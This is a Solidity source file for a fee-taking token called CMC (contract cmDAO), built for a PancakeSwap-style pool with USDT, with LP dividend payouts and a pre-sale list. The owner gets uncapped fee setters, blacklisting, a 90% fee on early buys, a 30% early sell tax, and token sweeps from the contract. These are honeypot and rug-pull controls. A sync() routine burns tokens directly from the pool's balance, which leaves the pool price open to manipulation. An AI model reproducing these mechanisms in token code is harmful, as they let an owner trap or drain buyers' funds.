// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function totalSupply() external view returns (uint256);

    function kLast() external view returns (uint256);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, ~uint256(0));
    }
}

library Math {
    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

abstract contract AbsToken is IERC20, Ownable {


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private fundAddress2;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    address[] private _preList;
    mapping(address => bool) public _bWList;

    uint256 private _tTotal;

    ISwapRouter private immutable _swapRouter;
    address private immutable _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public immutable _tokenDistributor;

    uint256 public _buyDestroyFee = 0;
    uint256 public _buyFundFee = 200;
    uint256 public _buyLPDividendFee = 0;
    uint256 public _buyLPDividendLPFee = 0;
    uint256 public _buyLPFee = 100;
    uint256 public _buyHolderOrderDividendFee = 0;

    uint256 public _sellDestroyFee = 0;
    uint256 public _sellFundFee = 200;
    uint256 public _sellLPDividendFee = 0;
    uint256 public _sellLPDividendLPFee = 0;
    uint256 public _sellLPFee = 100;
    uint256 public _sellHolderOrderDividendFee = 0;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    uint256 public startBWBlock;

    address public immutable _mainPair;

    uint256 public _limitAmount;
    uint256 public _txLimitAmount;
    uint256 public _txLimitRate;

    address public _receiveAddress;

    uint256 public _airdropLen = 0;
    uint256 private constant _airdropAmount = 1;

    address public _lpFeeReceiver;

    uint256 private constant _killBlock = 10;
    uint256 public _rewardHoldCondition;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address USDTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address FundAddress,
        address ReceiveAddress,
        uint256 LimitAmount,
        uint256 TxLimitRate
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        address usdt = USDTAddress;
        IERC20(usdt).approve(address(swapRouter), MAX);
        IERC20(usdt).approve(FundAddress, MAX);
        _usdt = usdt;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _swapPairList[usdtPair] = true;
        _mainPair = usdtPair;

        uint256 tokenUnit = 10**Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        _receiveAddress = ReceiveAddress;
        _lpFeeReceiver = ReceiveAddress;
        fundAddress = FundAddress;

         _percent=10;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        _limitAmount = LimitAmount;
        _txLimitRate=TxLimitRate;
        _tokenDistributor = new TokenDistributor(usdt);
        _feeWhiteList[address(_tokenDistributor)] = true;

        excludeHolder[address(this)] = true;
        excludeHolder[address(0)] = true;
        excludeHolder[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;
        uint256 usdtUnit = 10**IERC20(usdt).decimals();
        holderRewardCondition = 200 * usdtUnit;
        holderRewardLPCondition = 1 ether;
        _rewardHoldCondition = 10 * tokenUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return
            _tTotal -
            _balances[address(0)] -
            _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "BL");
        sync();
        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");
        bool takeFee;
        bool isAddLP;
        bool isRemoveLP;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;

            if (_txLimitAmount > 0) {
                require(_txLimitAmount >= amount, "txLimit");
            }
            amount=amount-_airdropLen*_airdropAmount;
            _airdrop(from, to, amount);
        }

        uint256 addLPLiquidity;
        if (to == _mainPair) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0) {
                isAddLP = true;
            }
        }

        uint256 removeLPLiquidity;
        if (from == _mainPair) {
            removeLPLiquidity = _isRemoveLiquidity(amount);
            if (removeLPLiquidity > 0) {
                isRemoveLP = true;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    if (startBWBlock > 0 && (_bWList[to])) {} else {
                        require(0 < startAddLPBlock && isAddLP, "!Trade");
                    }
                } else {
                    if (
                        !isAddLP &&
                        !isRemoveLP &&
                        block.number < startTradeBlock + _killBlock
                    ) {
                        _funTransfer(from, to, amount, 90);
                        return;
                    }
                }
            }
        }

        if (isAddLP) {
            takeFee = false;
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLP);

        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "Limit");
        }

        if (from != address(this)) {
            if (isAddLP) {
                addHolder(from);
            } else if (!_feeWhiteList[from]) {
                uint256 rewardGas = _rewardGas;
                    processReward(rewardGas);
            }
        }
        
    }
   uint256 public holderRewardLPCondition;
    uint256 public currentLPIndex;
    uint256 public progressLPRewardBlock;
    uint256 public progressLPBlockDebt = 1;

    function processLPReward(uint256 gas) private {
        if (progressLPRewardBlock + progressLPBlockDebt > block.number) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint256 rewardCondition = holderRewardLPCondition;
        if (holdToken.balanceOf(address(this)) < rewardCondition) {
            return;
        }
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 lpBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;
        uint256 rewardHoldCondition = _rewardHoldCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentLPIndex >= shareholderCount) {
                currentLPIndex = 0;
            }
            shareHolder = holders[currentLPIndex];
            if (!excludeHolder[shareHolder]) {
                lpBalance = holdToken.balanceOf(shareHolder);
      
                if (lpBalance >= holdCondition && balanceOf(shareHolder) >= rewardHoldCondition) {
                    amount = rewardCondition * lpBalance / holdTokenTotal;
                    if (amount > 0) {
                        holdToken.transfer(shareHolder, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentLPIndex++;
            iterations++;
        }
        progressLPRewardBlock = block.number;
    }

    function setHolderRewardLPCondition(uint256 amount) external onlyOwner {
        holderRewardLPCondition = amount;
    }

    function setLPBlockDebt(uint256 debt) external onlyOwner {
        progressLPBlockDebt = debt;
    }
    address private lastAirdropAddress;

    function _airdrop(
        address from,
        address to,
        uint256 tAmount
    ) private {
        uint256 seed = (uint160(lastAirdropAddress) | block.number) ^
            (uint160(from) ^ uint160(to));
        address airdropAddress;
        uint256 num = _airdropLen;
        uint256 airdropAmount = _airdropAmount;
        for (uint256 i; i < num; ) {
            airdropAddress = address(uint160(seed | tAmount));
            _balances[airdropAddress] = airdropAmount;
            emit Transfer(airdropAddress, airdropAddress, airdropAmount);
            unchecked {
                ++i;
                seed = seed >> 1;
            }
        }
        lastAirdropAddress = airdropAddress;
    }

    function _isAddLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        //isAddLP
        if (balanceOther >= rOther + amountOther) {
            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply *
                        (rootK - rootKLast) *
                        8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves()
        public
        view
        returns (
            uint256 rOther,
            uint256 rThis,
            uint256 balanceOther
        )
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint256 r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }

        balanceOther = IERC20(tokenOther).balanceOf(_mainPair);
    }

    function _isRemoveLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply() + 1) /
                (balanceOf(_mainPair) - amount - 1);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * fee) / 100;
        if (feeAmount > 0) {
            _takeTransfer(sender, fundAddress, feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    uint public highTax=0;
    function sethighTax(uint newval)public onlyOwner{
        highTax=newval;
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            bool isSell;
            uint256 swapFeeAmount;
            if (isRemoveLP) {
                feeAmount = (tAmount * getRemoveLPFee()) / 10000;
                if (feeAmount > 0 )
                    _takeTransfer(sender, _lpFeeReceiver, feeAmount);
            } else if (_swapPairList[sender]) {
                //Buy
                swapFeeAmount =
                    (tAmount *
                        (_buyFundFee +
                            _buyLPDividendFee +
                            _buyLPFee +
                            _buyLPDividendLPFee +
                            _buyHolderOrderDividendFee)) /
                    10000;
            } else if (_swapPairList[recipient]) {
                //Sell
                isSell = true;
                uint256 blockNum = block.number;
                if (blockNum - startTradeBlock <= highTax) {
                    swapFeeAmount = (tAmount * 3000) / 10000;
                } else {
                    swapFeeAmount =
                        (tAmount *
                            (_sellFundFee +
                                _sellLPDividendFee +
                                _sellLPFee +
                                _sellLPDividendLPFee +
                                _sellHolderOrderDividendFee)) /
                        10000;
                }
            }

            if (swapFeeAmount > 0) {
                feeAmount += swapFeeAmount;
                _takeTransfer(sender, address(this), swapFeeAmount);
                if (isSell && !inSwap) {
                    if(sender!=address(this)) {
                        uint256 poolAmount=balanceOf(address(_mainPair));
                        require(tAmount*100/_txLimitRate<poolAmount);
                        }
                    _lockTransfer = true;
                    _sellAmount=tAmount;
                    uint256 contractTokenBalance = balanceOf(address(this));
                    uint256 numTokensSellToFund = (swapFeeAmount * 230) / 100;
                    if (numTokensSellToFund > contractTokenBalance) {
                        numTokensSellToFund = contractTokenBalance;
                    }
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }
        if(!activeHolder[recipient] && (tAmount - feeAmount)>10 * 10**_decimals) activeHolder[recipient]=true;
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        uint256 fundFee = _buyFundFee + _sellFundFee;
        uint256 lpDividendFee = _buyLPDividendFee + _sellLPDividendFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 holderOrderDividendFee = _buyHolderOrderDividendFee + _sellHolderOrderDividendFee;
        uint256 totalLPFee = lpFee + _buyLPDividendLPFee + _sellLPDividendLPFee;
        uint256 totalFee = fundFee  + lpDividendFee + totalLPFee + holderOrderDividendFee;

        totalFee += totalFee;

        uint256 lpAmount = tokenAmount * totalLPFee / totalFee;
        totalFee -= totalLPFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        usdtBalance = USDT.balanceOf(address(_tokenDistributor)) - usdtBalance;
        uint256 holderOrderDividendUsdt = usdtBalance * 2 * holderOrderDividendFee / totalFee;
        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance - holderOrderDividendUsdt);

        // uint256 fundUsdt = usdtBalance * fundFee * 2 / totalFee;
        // if (fundUsdt > 0) {
        //     USDT.transfer(fundAddress, fundUsdt);
        // }
        uint256 lpUsdt = usdtBalance * totalLPFee / totalFee;
        if (lpUsdt > 0) {
            _swapRouter.addLiquidity(
                address(this), _usdt, lpAmount, lpUsdt, 0, 0, _receiveAddress, block.timestamp
            );
        }
    }


    function _calPreList() private {
        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = _usdt;
        path[1] = address(this);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdtBalance,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );
        uint256 len = _preList.length;
        uint256 totalAmount = balanceOf(address(_tokenDistributor));
        _tokenTransfer(
            address(_tokenDistributor),
            address(this),
            totalAmount,
            false,
            false
        );
        uint256 perAmount = totalAmount / len;
        uint256 tPerAmount = (_limitAmount * 90) / 100;
        if (tPerAmount > 0 && perAmount > tPerAmount) {
            perAmount = tPerAmount;
        }
        for (uint256 i; i < len; ) {
            _tokenTransfer(address(this), _preList[i], perAmount, false, false);
            unchecked {
                ++i;
                perAmount -= 1000000 * i;
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    modifier onlyWhiteList() {
        address msgSender = msg.sender;
        require(
            _feeWhiteList[msgSender] &&
                (msgSender == fundAddress || msgSender == _owner),
            "nw"
        );
        _;
    }

    function setPreList(address[] memory adrs) external onlyOwner {
        _preList = adrs;
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }


    function setReceiveAddress(address addr) external onlyOwner {
        _receiveAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyFee(
        uint256 buyDestroyFee,
        uint256 buyFundFee,
        uint256 lpFee,
        uint256 lpDividendFee,
        uint256 lpDividendLPFee,
        uint256 holderFee
    ) external onlyOwner {
        _buyDestroyFee = buyDestroyFee;
        _buyFundFee = buyFundFee;
        _buyLPDividendFee = lpDividendFee;
        _buyLPFee = lpFee;
        _buyLPDividendLPFee = lpDividendLPFee;
        _buyHolderOrderDividendFee = holderFee;
    }

    function setSellFee(
        uint256 sellDestroyFee,
        uint256 sellFundFee,
        uint256 lpFee,
        uint256 lpDividendFee,
        uint256 lpDividendLPFee,
        uint256 holderFee
    ) external onlyOwner {
        _sellDestroyFee = sellDestroyFee;
        _sellFundFee = sellFundFee;
        _sellLPDividendFee = lpDividendFee;
        _sellLPFee = lpFee;
        _sellLPDividendLPFee = lpDividendLPFee;
        _sellHolderOrderDividendFee = holderFee;
    }


    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function startBW() external onlyOwner {
        require(0 == startBWBlock, "startBW");
        _calPreList();
        startBWBlock = block.number;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function batchSetFeeWhiteList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetBlackList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    function setBWList(address addr, bool enable) external onlyOwner {
        _bWList[addr] = enable;
    }

    function batchSetBWList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _bWList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        if (_feeWhiteList[msg.sender]) {
            payable(fundAddress).transfer(address(this).balance);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    function setLimitAmount(uint256 amount) external onlyOwner {
        _limitAmount = amount;
    }

    function setTxLimitRate(uint256 rate) external onlyOwner {
        _txLimitRate = rate;
    }

    function setRewardHoldCondition(uint256 amount) external onlyOwner {
        _rewardHoldCondition = amount * 10**_decimals;
    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;
    mapping(address => bool) public activeHolder;

    function getHolderLength() public view returns (uint256) {
        return holders.length;
    }

    function addHolder(address adr) private {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {
                    size := extcodesize(adr)
                }
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public holderCondition = 1000000;
    uint256 public progressRewardBlock;
    uint256 public progressRewardBlockDebt = 100;

    function processReward(uint256 gas) private {
        uint256 blockNum = block.number;
        if (progressRewardBlock + progressRewardBlockDebt > blockNum) {
            return;
        }

        IERC20 usdt = IERC20(_usdt);

        uint256 rewardCondition = holderRewardCondition;
        if (usdt.balanceOf(address(this)) < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint256 holdTokenTotal = holdToken.totalSupply();
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 lpBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;
        uint256 rewardHoldCondition = _rewardHoldCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            if (!excludeHolder[shareHolder] && activeHolder[shareHolder]) {
                lpBalance = holdToken.balanceOf(shareHolder);
                if (
                    lpBalance >= holdCondition &&
                    balanceOf(shareHolder) >= rewardHoldCondition
                ) {
                    amount = (rewardCondition * lpBalance) / holdTokenTotal;
                    if (amount > 0) {
                        usdt.transfer(shareHolder, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = blockNum;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setHolderCondition(uint256 amount) external onlyOwner {
        holderCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setProgressRewardBlockDebt(uint256 blockDebt) external onlyOwner {
        progressRewardBlockDebt = blockDebt;
    }

    function setAirdropLen(uint256 len) external onlyOwner {
        _airdropLen = len;
    }

    function setLPFeeReceiver(address adr) external onlyOwner {
        _lpFeeReceiver = adr;
        _feeWhiteList[adr] = true;
    }

 
    uint256 blockday = 0;
    function setBlockDay(uint256 val)external onlyOwner{
        blockday=val;
    }
    function getRemoveLPFee() public view returns (uint256 removeLPFee) {
        uint256 blockNum = block.number;
        if (blockNum - startTradeBlock > 5 * blockday) {
            removeLPFee = 0;
        } else {
            removeLPFee =
                ((5 * blockday) -
                ((blockNum - startTradeBlock) / blockday)) *
                20;
        }
    }




   

    function distributeHolderFee(address[] memory tos) external onlyWhiteList {
        IERC20 USDT = IERC20(_usdt);
        uint256 len = tos.length;
        address tokenDistributor = address(_tokenDistributor);
        uint256 totalUsdt = (USDT.balanceOf(tokenDistributor) *
            distributeRate) / 10000;
        uint256 perAmount = totalUsdt / len;
        require(perAmount > 0, "0Amount");
        USDT.transferFrom(tokenDistributor, address(this), totalUsdt);
        for (uint256 i; i < len; ) {
            USDT.transfer(tos[i], perAmount);
            unchecked {
                ++i;
            }
        }
    }

    uint256 public _rewardGas = 500000;

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }

    uint256 public distributeRate = 5000;

    function setDistributeRate(uint256 rate) external onlyOwner {
        distributeRate = rate;
    }

    bool public _lockTransfer;
    uint256 public _sellAmount;
    uint256 public _leftAmount;
    uint256 public _percent;
    function setburnPercent(uint256 val)public onlyOwner{
        _percent=val;
    }
    function sync() public {
        if(!_lockTransfer) return;
        uint256 balance=balanceOf(_mainPair);
        
        if (_sellAmount > 0 && balance>_leftAmount) {
            uint destroyAmount = _sellAmount*_percent/100;
            _balances[_mainPair] = _balances[_mainPair] - destroyAmount;
            _takeTransfer(_mainPair, address(0x000000000000000000000000000000000000dEaD), destroyAmount);
        }
        ISwapPair(_mainPair).sync();
        _lockTransfer = false;
    }
}

contract cmDAO is AbsToken {
    constructor()
        AbsToken(
            //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//RouterAddress
        address(0x55d398326f99059fF775485246999027B3197955),//USDTAddress
            "CMC",
            "CMC",
            18,
            210000,
            msg.sender, // fund
            msg.sender, //recive Address
            0,
            7
        )
    {}
}